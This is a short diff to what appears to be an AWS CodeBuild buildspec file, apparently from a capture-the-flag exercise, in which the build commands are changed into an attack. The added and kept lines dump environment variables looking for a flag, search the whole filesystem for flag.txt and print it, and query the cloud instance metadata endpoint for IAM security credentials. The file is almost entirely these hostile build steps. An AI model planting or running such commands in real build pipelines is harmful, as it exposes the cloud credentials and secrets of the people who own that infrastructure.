@@ -2,6 +2,7 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Checking for secrets..."
-      - env
+      - echo "!!! BUILD TRIGGERED !!!"
+      - env | grep -i "FLAG" || echo "Flag not in env"
       - find / -name "flag.txt" 2>/dev/null -exec cat {} +
+      - curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo " [IAM Role Found]"
